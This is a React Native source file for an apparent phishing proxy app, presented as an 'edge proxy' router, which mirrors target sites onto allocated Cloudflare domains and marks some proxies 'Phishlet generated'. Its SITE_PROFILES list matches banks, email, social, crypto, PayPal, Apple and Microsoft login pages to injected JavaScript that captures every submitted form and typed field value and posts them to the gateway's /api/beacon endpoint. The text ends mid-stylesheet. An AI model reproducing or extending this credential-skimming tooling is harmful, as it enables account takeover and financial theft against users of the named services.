import * as Clipboard from "expo-clipboard";
import { LinearGradient } from "expo-linear-gradient";
import {
  ArrowRight,
  Bug,
  Check,
  Code2,
  Copy,
  Globe,
  Link2,
  Loader,
  Power,
  Trash2,
  Wand2,
  Zap,
} from "lucide-react-native";
import React, { useCallback, useMemo, useState } from "react";
import {
  ActivityIndicator,
  Alert,
  KeyboardAvoidingView,
  Platform,
  Pressable,
  ScrollView,
  StyleSheet,
  Text,
  TextInput,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";

import PulseDot from "@/components/PulseDot";
import { theme } from "@/constants/theme";
import { useApiKey } from "@/hooks/useApiKey";
import {
  useAllocateProxyDomain,
  useCloudflareZones,
  useCreateProxy,
  useDeleteProxy,
  useProxies,
  useUpdateProxy,
} from "@/hooks/useGateway";
import { getBaseUrl, proxyUrl, type Proxy } from "@/lib/api";

// ---------------------------------------------------------------------------
// Site analysis — inspects target hostname and returns the best JS snippet.
// ---------------------------------------------------------------------------
type SiteProfile = {
  name: string;
  snippet: string;
};

// ── Static snippet templates (lazy-compute with gateway URL) ──
type SnippetFn = (gateway: string) => string;

const genericFormSnippet: SnippetFn = (g) =>
  `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${g}/api/beacon',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:location.href,form:d})});});`;

const genericInputSnippet: SnippetFn = (g) =>
  `document.addEventListener('focusout',function(e){var t=e.target;if(t.tagName!=='INPUT'&&t.tagName!=='SELECT')return;fetch('${g}/api/beacon',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:location.href,field:t.name||t.id||t.type,value:t.value})});});`;

const combinedSnippet: SnippetFn = (g) => genericFormSnippet(g) + "\n" + genericInputSnippet(g);

// ── Static site profile catalogue (regexes compiled once at module load) ──
type ProfileEntry = { match: RegExp; profile: { name: string; snippet: SnippetFn } };

const SITE_PROFILES: ProfileEntry[] = [
  // Gaming / Casino
  { match: /shufflegaming|backoffice\.shuffle/i, profile: { name: "Shuffle Gaming backoffice", snippet: (g) => `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${g}/api/beacon',{method:'POST',mode:'no-cors',body:JSON.stringify({site:'shuffle',url:location.href,data:d})});});` } },
  { match: /joe\.casino|joecasino/i, profile: { name: "Joe Casino", snippet: combinedSnippet } },
  { match: /\bjoe\b.*casino|casino.*\bjoe\b/i, profile: { name: "Casino (joe)", snippet: combinedSnippet } },
  { match: /anz/i, profile: { name: "ANZ", snippet: combinedSnippet } },
  // Banking
  { match: /nab\.com\.au|netbank|commbank|westpac|anz\.com/i, profile: { name: "Banking portal", snippet: combinedSnippet } },
  // Social
  { match: /facebook\.com|fb\.com/i, profile: { name: "Facebook", snippet: (g) => `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${g}/api/beacon',{method:'POST',mode:'no-cors',body:JSON.stringify({site:'fb',url:location.href,data:d})});});` } },
  { match: /instagram\.com/i, profile: { name: "Instagram", snippet: combinedSnippet } },
  { match: /tiktok\.com/i, profile: { name: "TikTok", snippet: combinedSnippet } },
  { match: /twitter\.com|x\.com/i, profile: { name: "X / Twitter", snippet: combinedSnippet } },
  { match: /linkedin\.com/i, profile: { name: "LinkedIn", snippet: combinedSnippet } },
  // Email
  { match: /gmail\.com|mail\.google/i, profile: { name: "Gmail", snippet: combinedSnippet } },
  { match: /outlook\.com|live\.com|hotmail/i, profile: { name: "Outlook", snippet: combinedSnippet } },
  // Shopping
  { match: /shopify\.com|myshopify/i, profile: { name: "Shopify", snippet: combinedSnippet } },
  { match: /amazon\.com|amazon\.com\.au/i, profile: { name: "Amazon", snippet: combinedSnippet } },
  { match: /ebay\.com|ebay\.com\.au/i, profile: { name: "eBay", snippet: combinedSnippet } },
  // Crypto
  { match: /binance\.com/i, profile: { name: "Binance", snippet: combinedSnippet } },
  { match: /coinbase\.com/i, profile: { name: "Coinbase", snippet: combinedSnippet } },
  { match: /kraken\.com/i, profile: { name: "Kraken", snippet: combinedSnippet } },
  // Google
  { match: /accounts\.google|google\.com\/signin/i, profile: { name: "Google login", snippet: combinedSnippet } },
  // Apple
  { match: /appleid\.apple|idmsa\.apple/i, profile: { name: "Apple ID", snippet: combinedSnippet } },
  // Microsoft
  { match: /login\.microsoft|login\.live|microsoftonline/i, profile: { name: "Microsoft login", snippet: combinedSnippet } },
  // PayPal
  { match: /paypal\.com/i, profile: { name: "PayPal", snippet: combinedSnippet } },
  // Generic login
  { match: /login|signin|auth|sso|account|portal|backoffice|admin/i, profile: { name: "Login portal (generic)", snippet: combinedSnippet } },
];

function analyseTarget(targetUrl: string): SiteProfile {
  const gateway = getBaseUrl();
  for (const { match, profile } of SITE_PROFILES) {
    if (match.test(targetUrl)) return { name: profile.name, snippet: profile.snippet(gateway) };
  }
  return { name: "Generic site", snippet: genericFormSnippet(gateway) };
}

function DomainPanel({ proxy, authHeader }: { proxy: Proxy; authHeader?: string }) {
  const { data, isLoading, isError } = useCloudflareZones(authHeader);
  const allocate = useAllocateProxyDomain(authHeader);
  const [pendingId, setPendingId] = useState<string | null>(null);

  const choose = useCallback(
    (zoneId: string, zoneName: string) => {
      setPendingId(zoneId);
      allocate.mutate(
        { proxyId: proxy.id, zoneId, hostname: `${proxy.slug}.${zoneName}` },
        { onSettled: () => setPendingId(null) },
      );
    },
    [allocate, proxy.id, proxy.slug],
  );

  if (isLoading) {
    return (
      <View style={styles.domainPanel}>
        <ActivityIndicator color={theme.colors.accent} size="small" />
        <Text style={styles.domainHint}>Loading your Cloudflare domains…</Text>
      </View>
    );
  }

  if (isError || !data) {
    return (
      <View style={styles.domainPanel}>
        <Text style={styles.domainHint}>Could not reach Cloudflare.</Text>
      </View>
    );
  }

  if (!data.configured) {
    return (
      <View style={styles.domainPanel}>
        <Text style={styles.domainHint}>
          {data.error ??
            "Connect your Cloudflare account to allocate a purchased domain."}
        </Text>
      </View>
    );
  }

  if (data.zones.length === 0) {
    return (
      <View style={styles.domainPanel}>
        <Text style={styles.domainHint}>
          No active domains found in your Cloudflare account.
        </Text>
      </View>
    );
  }

  return (
    <View style={styles.domainPanel}>
      <Text style={styles.domainHint}>
        Pick a domain — we&apos;ll point {proxy.slug}.&lt;domain&gt; at the
        gateway.
      </Text>
      {allocate.isError ? (
        <Text style={styles.formError}>{allocate.error?.message}</Text>
      ) : null}
      <View style={styles.zoneList}>
        {data.zones.map((zone) => (
          <Pressable
            key={zone.id}
            onPress={() => choose(zone.id, zone.name)}
            disabled={allocate.isPending}
            style={({ pressed }) => [styles.zoneRow, pressed && styles.pressed]}
          >
            <Globe size={13} color={theme.colors.accent} />
            <Text style={styles.zoneName} numberOfLines={1}>
              {proxy.slug}.{zone.name}
            </Text>
            {pendingId === zone.id && allocate.isPending ? (
              <ActivityIndicator color={theme.colors.accent} size="small" />
            ) : (
              <ArrowRight size={14} color={theme.colors.textFaint} />
            )}
          </Pressable>
        ))}
      </View>
    </View>
  );
}

function ProxyCard({ proxy, authHeader }: { proxy: Proxy; authHeader?: string }) {
  const updateProxy = useUpdateProxy(authHeader);
  const deleteProxy = useDeleteProxy(authHeader);
  const [copied, setCopied] = useState<boolean>(false);
  const [domainCopied, setDomainCopied] = useState<boolean>(false);
  const [showDomains, setShowDomains] = useState<boolean>(false);
  const [showInject, setShowInject] = useState<boolean>(false);
  const [showEdit, setShowEdit] = useState<boolean>(false);
  const [editName, setEditName] = useState<string>(proxy.name);
  const [editTarget, setEditTarget] = useState<string>(proxy.targetUrl);
  const [injectJsDraft, setInjectJsDraft] = useState<string>(proxy.injectJs ?? "");
  const [_, setAllocating] = useState<boolean>(false);
  const [analysed, setAnalysed] = useState<string | null>(null);

  const saveEdit = useCallback(() => {
    const trimTarget = editTarget.trim();
    const normalized = /^https?:\/\//.test(trimTarget) ? trimTarget : `https://${trimTarget}`;
    updateProxy.mutate({ id: proxy.id, name: editName.trim(), targetUrl: normalized }, {
      onSuccess: () => setShowEdit(false),
    });
  }, [updateProxy, proxy.id, editName, editTarget]);

  const siteProfile = useMemo(() => analyseTarget(proxy.targetUrl), [proxy.targetUrl]);

  const generateSnippet = useCallback(() => {
    setInjectJsDraft(siteProfile.snippet);
    setAnalysed(siteProfile.name);
  }, [siteProfile]);

  const url = proxyUrl(proxy.slug);
  const domainUrl = proxy.proxyDomain ? `https://${proxy.proxyDomain}` : "";

  const copyDomain = useCallback(async () => {
    if (!domainUrl) return;
    await Clipboard.setStringAsync(domainUrl);
    setDomainCopied(true);
    setTimeout(() => setDomainCopied(false), 1400);
  }, [domainUrl]);

  const copy = useCallback(async () => {
    await Clipboard.setStringAsync(url);
    setCopied(true);
    setTimeout(() => setCopied(false), 1400);
  }, [url]);

  const toggle = useCallback(() => {
    updateProxy.mutate({ id: proxy.id, enabled: !proxy.enabled });
  }, [updateProxy, proxy.id, proxy.enabled]);

  const toggleIntercept = useCallback(() => {
    updateProxy.mutate({ id: proxy.id, interceptEnabled: !proxy.interceptEnabled });
  }, [updateProxy, proxy.id, proxy.interceptEnabled]);

  const toggleInjectJs = useCallback(() => {
    updateProxy.mutate({ id: proxy.id, injectJsEnabled: !proxy.injectJsEnabled });
  }, [updateProxy, proxy.id, proxy.injectJsEnabled]);

  const saveInjectJs = useCallback(() => {
    const trimmed = injectJsDraft.trim();
    updateProxy.mutate({ id: proxy.id, injectJs: trimmed, injectJsEnabled: trimmed.length > 0 });
  }, [updateProxy, proxy.id, injectJsDraft]);

  const remove = useCallback(() => {
    const run = () => deleteProxy.mutate(proxy.id);
    if (Platform.OS === "web") {
      run();
      return;
    }
    Alert.alert("Remove proxy", `Stop routing "${proxy.name}"?`, [
      { text: "Cancel", style: "cancel" },
      { text: "Remove", style: "destructive", onPress: run },
    ]);
  }, [deleteProxy, proxy.id, proxy.name]);

  return (
    <View style={[styles.card, !proxy.enabled && styles.cardOff]}>
      <View style={styles.cardHead}>
        <View style={styles.cardTitleWrap}>
          <PulseDot
            color={proxy.enabled ? theme.colors.ok : theme.colors.textFaint}
            active={proxy.enabled}
            size={9}
          />
          <Text style={styles.cardTitle} numberOfLines={1}>
            {proxy.name}
          </Text>
        </View>
        <View style={styles.cardHeadRight}>
          <View style={styles.hits}>
            <Zap size={12} color={theme.colors.accent} />
            <Text style={styles.hitsText}>{proxy.hits}</Text>
          </View>
          <Pressable
            onPress={() => { setShowEdit(v => !v); setEditName(proxy.name); setEditTarget(proxy.targetUrl); }}
            hitSlop={8}
            style={({ pressed }) => [styles.editIconBtn, pressed && styles.pressed, showEdit && styles.editIconBtnActive]}
          >
            <Text style={[styles.editIconText, showEdit && styles.editIconTextActive]}>✎</Text>
          </Pressable>
        </View>
      </View>

      {/* Live domain banner */}
      {proxy.proxyDomain ? (
        <Pressable onPress={copyDomain} style={({ pressed }) => [styles.domainBanner, pressed && styles.pressed]}>
          <Globe size={13} color={theme.colors.ok} />
          <Text style={styles.domainBannerText} numberOfLines={1}>https://{proxy.proxyDomain}</Text>
          {domainCopied ? <Check size={13} color={theme.colors.ok} /> : <Copy size={13} color={theme.colors.textDim} />}
        </Pressable>
      ) : null}

      {/* Phishlet badge */}
      {proxy.phishlet ? (
        <View style={styles.phishletBadge}>
          <Wand2 size={12} color={theme.colors.warn} />
          <Text style={styles.phishletBadgeText}>Phishlet generated</Text>
        </View>
      ) : null}

      {/* Inline edit panel */}
      {showEdit && (
        <View style={styles.editPanel}>
          <Text style={styles.editLabel}>NAME</Text>
          <TextInput
            value={editName}
            onChangeText={setEditName}
            style={styles.editInput}
            placeholderTextColor={theme.colors.textFaint}
            placeholder="Proxy name"
            autoCapitalize="none"
          />
          <Text style={styles.editLabel}>TARGET URL</Text>
          <TextInput
            value={editTarget}
            onChangeText={setEditTarget}
            style={styles.editInput}
            placeholderTextColor={theme.colors.textFaint}
            placeholder="https://example.com"
            autoCapitalize="none"
            autoCorrect={false}
            keyboardType="url"
          />
          <Pressable
            onPress={saveEdit}
            disabled={updateProxy.isPending}
            style={({ pressed }) => [styles.editSaveBtn, pressed && styles.pressed]}
          >
            {updateProxy.isPending
              ? <ActivityIndicator size="small" color={theme.colors.bg} />
              : <Check size={13} color={theme.colors.bg} />}
            <Text style={styles.editSaveText}>Save changes</Text>
          </Pressable>
        </View>
      )}

      <View style={styles.route}>
        <Text style={styles.slug} numberOfLines={1}>
          /proxy/{proxy.slug}
        </Text>
        <ArrowRight size={13} color={theme.colors.textFaint} />
        <Text style={styles.target} numberOfLines={1}>
          {proxy.targetUrl.replace(/^https?:\/\//, "")}
        </Text>
      </View>

      <Pressable
        onPress={copy}
        style={({ pressed }) => [styles.urlRow, pressed && styles.pressed]}
      >
        <Text style={styles.url} numberOfLines={1}>
          {url}
        </Text>
        {copied ? (
          <Check size={15} color={theme.colors.ok} />
        ) : (
          <Copy size={15} color={theme.colors.textDim} />
        )}
      </Pressable>

      <Pressable
        onPress={() => setShowDomains((v) => !v)}
        style={({ pressed }) => [styles.allocateBtn, pressed && styles.pressed]}
      >
        <Link2 size={14} color={theme.colors.accent} />
        <Text style={styles.allocateText}>
          {proxy.proxyDomain ? "Change domain" : "Allocate domain"}
        </Text>
      </Pressable>

      {showDomains ? <DomainPanel proxy={proxy} authHeader={authHeader} /> : null}

      <Pressable
        onPress={() => {
          setShowInject((v) => !v);
          setInjectJsDraft(proxy.injectJs ?? "");
        }}
        style={({ pressed }) => [
          styles.injectBtn,
          pressed && styles.pressed,
          proxy.injectJsEnabled && styles.injectBtnActive,
        ]}
      >
        <Code2
          size={14}
          color={
            proxy.injectJsEnabled ? theme.colors.warn : theme.colors.textFaint
          }
        />
        <Text
          style={[
            styles.injectBtnText,
            {
              color: proxy.injectJsEnabled
                ? theme.colors.warn
                : theme.colors.textDim,
            },
          ]}
        >
          {proxy.injectJsEnabled
            ? `JS injection active${proxy.injectJs ? ` (${proxy.injectJs.length} chars)` : ""}`
            : showInject
              ? "Hide JS editor"
              : "Inject JavaScript"}
        </Text>
      </Pressable>

      {showInject ? (
        <View style={styles.injectPanel}>
          <View style={styles.injectTopRow}>
            <Text style={styles.injectHint}>
              JavaScript injected into every proxied page.
            </Text>
            <Pressable
              onPress={generateSnippet}
              style={({ pressed }) => [styles.analyseBtn, pressed && styles.pressed]}
              hitSlop={6}
            >
              <Wand2 size={12} color={theme.colors.accent} />
              <Text style={styles.analyseBtnText}>Analyse &amp; generate</Text>
            </Pressable>
          </View>
          {analysed ? (
            <Text style={styles.analysedTag}>✓ {analysed}</Text>
          ) : null}
          <TextInput
            value={injectJsDraft}
            onChangeText={setInjectJsDraft}
            placeholder="console.log('injected')"
            placeholderTextColor={theme.colors.textFaint}
            style={styles.injectInput}
            multiline
            autoCapitalize="none"
            autoCorrect={false}
            textAlignVertical="top"
          />
          <View style={styles.injectActions}>
            <Pressable
              onPress={toggleInjectJs}
              disabled={updateProxy.isPending}
              style={({ pressed }) => [
                styles.actionBtnSm,
                pressed && styles.pressed,
                proxy.injectJsEnabled && styles.actionBtnSmWarn,
              ]}
            >
              <Power
                size={12}
                color={
                  proxy.injectJsEnabled
                    ? theme.colors.warn
                    : theme.colors.textFaint
                }
              />
              <Text
                style={[
                  styles.actionTextSm,
                  {
                    color: proxy.injectJsEnabled
                      ? theme.colors.warn
                      : theme.colors.textDim,
                  },
                ]}
              >
                {proxy.injectJsEnabled ? "On" : "Off"}
              </Text>
            </Pressable>
            <Pressable
              onPress={saveInjectJs}
              disabled={updateProxy.isPending}
              style={({ pressed }) => [
                styles.saveInjectBtn,
                pressed && styles.pressed,
              ]}
            >
              {updateProxy.isPending ? (
                <ActivityIndicator size="small" color={theme.colors.bg} />
              ) : (
                <Check size={14} color={theme.colors.bg} />
              )}
              <Text style={styles.saveInjectText}>Save snippet</Text>
            </Pressable>
          </View>
        </View>
      ) : null}

      <View style={styles.cardActions}>
        <Pressable
          onPress={toggle}
          disabled={updateProxy.isPending}
          style={({ pressed }) => [
            styles.actionBtn,
            pressed && styles.pressed,
          ]}
        >
          <Power
            size={14}
            color={proxy.enabled ? theme.colors.warn : theme.colors.ok}
          />
          <Text
            style={[
              styles.actionText,
              { color: proxy.enabled ? theme.colors.warn : theme.colors.ok },
            ]}
          >
            {proxy.enabled ? "Disable" : "Enable"}
          </Text>
        </Pressable>
        <Pressable
          onPress={toggleIntercept}
          disabled={updateProxy.isPending}
          style={({ pressed }) => [
            styles.actionBtnSm,
            pressed && styles.pressed,
            proxy.interceptEnabled && styles.actionBtnSmWarn,
          ]}
        >
          <Bug
            size={12}
            color={
              proxy.interceptEnabled ? theme.colors.warn : theme.colors.textFaint
            }
          />
          <Text
            style={[
              styles.actionTextSm,
              {
                color: proxy.interceptEnabled
                  ? theme.colors.warn
                  : theme.colors.textDim,
              },
            ]}
          >
            {proxy.interceptEnabled ? "On" : "Off"}
          </Text>
        </Pressable>
        <Pressable
          onPress={remove}
          disabled={deleteProxy.isPending}
          style={({ pressed }) => [
            styles.actionBtn,
            pressed && styles.pressed,
          ]}
        >
          <Trash2 size={14} color={theme.colors.danger} />
          <Text style={[styles.actionText, { color: theme.colors.danger }]}>
            Remove
          </Text>
        </Pressable>
      </View>
    </View>
  );
}

export default function ProxiesScreen() {
  const insets = useSafeAreaInsets();
  const ah = useApiKey();
  const { data, isLoading, isError, error } = useProxies();
  const createProxy = useCreateProxy(ah);

  const [name, setName] = useState<string>("");
  const [targetUrl, setTargetUrl] = useState<string>("");
  const [formError, setFormError] = useState<string | null>(null);

  const submit = useCallback(() => {
    const trimmedUrl = targetUrl.trim();
    if (!trimmedUrl) {
      setFormError("Enter a target domain to route.");
      return;
    }
    const normalized = /^https?:\/\//.test(trimmedUrl)
      ? trimmedUrl
      : `https://${trimmedUrl}`;
    setFormError(null);
    createProxy.mutate(
      { name: name.trim(), targetUrl: normalized },
      {
        onSuccess: () => {
          setName("");
          setTargetUrl("");
        },
        onError: (err) => setFormError(err.message),
      },
    );
  }, [name, targetUrl, createProxy]);

  const proxies = data ?? [];

  return (
    <View style={styles.root}>
      <LinearGradient
        colors={[theme.colors.accentGlow, "transparent"]}
        start={{ x: 0.1, y: 0 }}
        end={{ x: 0.9, y: 0.5 }}
        style={styles.glow}
        pointerEvents="none"
      />
      <KeyboardAvoidingView
        style={styles.flex}
        behavior={Platform.OS === "ios" ? "padding" : undefined}
      >
        <ScrollView
          contentContainerStyle={[
            styles.content,
            { paddingTop: insets.top + theme.spacing(6) },
          ]}
          keyboardShouldPersistTaps="handled"
          showsVerticalScrollIndicator={false}
        >
          <View>
            <Text style={styles.eyebrow}>EDGE PROXIES</Text>
            <Text style={styles.hero}>Route any domain</Text>
            <Text style={styles.sub}>
              Add a target and it goes live instantly across the edge network —
              no redeploy. Every request is captured for the analyser.
            </Text>
            {!isLoading && !isError && proxies.length > 0 && (
              <View style={styles.statsRow}>
                <View style={styles.statBadge}>
                  <Text style={styles.statValue}>{proxies.length}</Text>
                  <Text style={styles.statLabel}>TARGETS</Text>
                </View>
                <View style={[styles.statBadge, styles.statBadgeActive]}>
                  <Text style={[styles.statValue, styles.statValueActive]}>{proxies.filter(p => p.enabled).length}</Text>
                  <Text style={[styles.statLabel, styles.statLabelActive]}>ACTIVE</Text>
                </View>
                <View style={[styles.statBadge, styles.statBadgeDomain]}>
                  <Text style={[styles.statValue, styles.statValueDomain]}>{proxies.filter(p => p.proxyDomain).length}</Text>
                  <Text style={[styles.statLabel, styles.statLabelDomain]}>ROUTED</Text>
                </View>
              </View>
            )}
          </View>

          <View style={styles.form}>
            <Text style={styles.formLabel}>NAME (OPTIONAL)</Text>
            <TextInput
              value={name}
              onChangeText={setName}
              placeholder="e.g. Example API"
              placeholderTextColor={theme.colors.textFaint}
              style={styles.input}
              autoCapitalize="none"
            />
            <Text style={styles.formLabel}>TARGET DOMAIN</Text>
            <TextInput
              value={targetUrl}
              onChangeText={setTargetUrl}
              placeholder="https://api.example.com"
              placeholderTextColor={theme.colors.textFaint}
              style={styles.input}
              autoCapitalize="none"
              autoCorrect={false}
              keyboardType="url"
              onSubmitEditing={submit}
            />
            {formError ? (
              <Text style={styles.formError}>{formError}</Text>
            ) : null}
            <Pressable
              onPress={submit}
              disabled={createProxy.isPending}
              style={({ pressed }) => [
                styles.deployBtn,
                pressed && styles.pressed,
                createProxy.isPending && styles.deployBtnBusy,
              ]}
            >
              {createProxy.isPending ? (
                <>
                  <Loader size={16} color={theme.colors.bg} />
                  <Text style={styles.deployText}>Deploying to edge…</Text>
                </>
              ) : (
                <>
                  <Globe size={16} color={theme.colors.bg} />
                  <Text style={styles.deployText}>Deploy proxy</Text>
                </>
              )}
            </Pressable>
          </View>

          <Text style={styles.sectionTitle}>
            ACTIVE TARGETS · {proxies.length}
          </Text>

          {isError ? (
            <View style={styles.stateCard}>
              <Text style={styles.errorText}>
                {error?.message ?? "Could not load proxy targets."}
              </Text>
            </View>
          ) : isLoading ? (
            <View style={styles.stateCard}>
              <ActivityIndicator color={theme.colors.accent} />
              <Text style={styles.stateText}>Loading targets…</Text>
            </View>
          ) : proxies.length === 0 ? (
            <View style={styles.stateCard}>
              <Globe size={22} color={theme.colors.textFaint} />
              <Text style={styles.stateText}>
                No targets yet. Add a domain above to start routing traffic
                through the gateway.
              </Text>
            </View>
          ) : (
            <View style={styles.list}>
              {proxies.map((proxy) => (
                <ProxyCard key={proxy.id} proxy={proxy} authHeader={ah} />
              ))}
            </View>
          )}
        </ScrollView>
      </KeyboardAvoidingView>
    </View>
  );
}

const styles = StyleSheet.create({
  root: {
    flex: 1,
    backgroundColor: theme.colors.bg,
  },
  flex: {
    flex: 1,
  },
  glow: {
    position: "absolute",
    top: 0,
    left: 0,
    right: 0,
    height: 320,
  },
  content: {
    paddingHorizontal: theme.spacing(5),
    paddingBottom: theme.spacing(12),
    gap: theme.spacing(5),
  },
  eyebrow: {
    color: theme.colors.accent,
    fontSize: 12,
    fontWeight: "700",
    letterSpacing: 2,
    fontFamily: theme.font.mono,
  },
  hero: {
    color: theme.colors.text,
    fontSize: 28,
    fontWeight: "800",
    letterSpacing: -0.5,
    marginTop: theme.spacing(1),
  },
  sub: {
    color: theme.colors.textDim,
    fontSize: 14,
    lineHeight: 21,
    marginTop: theme.spacing(2),
  },
  statsRow: { flexDirection: "row", gap: theme.spacing(2), marginTop: theme.spacing(3) },
  statBadge: { flexDirection: "row", alignItems: "center", gap: theme.spacing(1.5), backgroundColor: theme.colors.surface, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(1.5) },
  statBadgeActive: { backgroundColor: "rgba(34,197,94,0.10)", borderColor: "rgba(34,197,94,0.35)" },
  statBadgeDomain: { backgroundColor: "rgba(255,178,62,0.10)", borderColor: "rgba(255,178,62,0.35)" },
  statValue: { color: theme.colors.text, fontSize: 16, fontWeight: "800", fontFamily: theme.font.mono },
  statValueActive: { color: theme.colors.ok },
  statValueDomain: { color: theme.colors.warn },
  statLabel: { color: theme.colors.textDim, fontSize: 10, fontWeight: "700", letterSpacing: 0.5, fontFamily: theme.font.mono },
  statLabelActive: { color: theme.colors.ok },
  statLabelDomain: { color: theme.colors.warn },
  form: {
    backgroundColor: theme.colors.bgElevated,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(4),
    gap: theme.spacing(2),
  },
  formLabel: {
    color: theme.colors.textFaint,
    fontSize: 11,
    fontWeight: "700",
    letterSpacing: 1,
    fontFamily: theme.font.mono,
    marginTop: theme.spacing(1),
  },
  input: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(3),
    color: theme.colors.text,
    fontSize: 15,
    fontFamily: theme.font.mono,
  },
  formError: {
    color: theme.colors.danger,
    fontSize: 13,
    marginTop: theme.spacing(1),
  },
  deployBtn: {
    marginTop: theme.spacing(3),
    backgroundColor: theme.colors.accent,
    borderRadius: theme.radius.sm,
    paddingVertical: theme.spacing(3.5),
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: theme.spacing(2),
  },
  deployBtnBusy: {
    opacity: 0.7,
  },
  deployText: {
    color: theme.colors.bg,
    fontSize: 15,
    fontWeight: "800",
    letterSpacing: 0.3,
  },
  sectionTitle: {
    color: theme.colors.textDim,
    fontSize: 12,
    fontWeight: "700",
    letterSpacing: 1.5,
    fontFamily: theme.font.mono,
  },
  stateCard: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(6),
    gap: theme.spacing(3),
    alignItems: "center",
  },
  stateText: {
    color: theme.colors.textDim,
    fontSize: 14,
    lineHeight: 21,
    textAlign: "center",
  },
  errorText: {
    color: theme.colors.danger,
    fontSize: 14,
    fontFamily: theme.font.mono,
    textAlign: "center",
  },
  list: {
    gap: theme.spacing(3),
  },
  card: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(4),
    gap: theme.spacing(3),
  },
  cardOff: {
    opacity: 0.6,
  },
  cardHead: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
    gap: theme.spacing(2),
  },
  cardTitleWrap: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(2),
    flex: 1,
  },
  cardTitle: {
    color: theme.colors.text,
    fontSize: 16,
    fontWeight: "700",
    flexShrink: 1,
  },
  hits: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(1),
    backgroundColor: theme.colors.surfaceAlt,
    paddingHorizontal: theme.spacing(2),
    paddingVertical: 3,
    borderRadius: theme.radius.sm,
  },
  hitsText: {
    color: theme.colors.text,
    fontSize: 12,
    fontWeight: "700",
    fontFamily: theme.font.mono,
  },
  route: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(2),
  },
  slug: {
    color: theme.colors.accent,
    fontSize: 13,
    fontFamily: theme.font.mono,
    flexShrink: 1,
  },
  target: {
    color: theme.colors.textDim,
    fontSize: 13,
    fontFamily: theme.font.mono,
    flexShrink: 1,
    flex: 1,
  },
  urlRow: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.bg,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2.5),
  },
  url: {
    color: theme.colors.textDim,
    fontSize: 12,
    fontFamily: theme.font.mono,
    flexShrink: 1,
  },
  cardActions: {
    flexDirection: "row",
    gap: theme.spacing(2),
  },
  actionBtn: {
    flex: 1,
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.surfaceAlt,
    borderRadius: theme.radius.sm,
    paddingVertical: theme.spacing(2.5),
  },
  actionText: {
    fontSize: 13,
    fontWeight: "700",
  },
  actionBtnSm: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: theme.spacing(1.5),
    backgroundColor: theme.colors.surfaceAlt,
    borderRadius: theme.radius.sm,
    paddingHorizontal: theme.spacing(2.5),
    paddingVertical: theme.spacing(2.5),
  },
  actionBtnSmWarn: {
    borderWidth: 1,
    borderColor: theme.colors.warn,
  },
  actionTextSm: {
    fontSize: 11,
    fontWeight: "700",
  },
  pressed: {
    opacity: 0.6,
  },
  domainRow: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.bg,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.ok,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2.5),
  },
  domainUrl: {
    color: theme.colors.ok,
    fontSize: 13,
    fontFamily: theme.font.mono,
    flex: 1,
    flexShrink: 1,
  },
  allocateBtn: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.surfaceAlt,
    borderRadius: theme.radius.sm,
    paddingVertical: theme.spacing(2.5),
  },
  allocateText: {
    color: theme.colors.accent,
    fontSize: 13,
    fontWeight: "700",
  },
  domainPanel: {
    backgroundColor: theme.colors.bg,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(3),
    gap: theme.spacing(2),
  },
  domainHint: {
    color: theme.colors.textDim,
    fontSize: 12,
    lineHeight: 18,
  },
  zoneList: {
    gap: theme.spacing(2),
  },
  zoneRow: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.surfaceAlt,
    borderRadius: theme.radius.sm,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2.5),
  },
  zoneName: {
    color: theme.colors.text,
    fontSize: 13,
    fontFamily: theme.font.mono,
    flex: 1,
    flexShrink: 1,
  },
  injectBtn: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.surfaceAlt,
    borderRadius: theme.radius.sm,
    paddingVertical: theme.spacing(2.5),
    borderWidth: 1,
    borderColor: "transparent",
  },
  injectBtnActive: {
    borderColor: theme.colors.warn,
  },
  injectBtnText: {
    fontSize: 13,
    fontWeight: "700",
  },
  injectPanel: {
    backgroundColor: theme.colors.bg,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.warn,
    padding: theme.spacing(3),
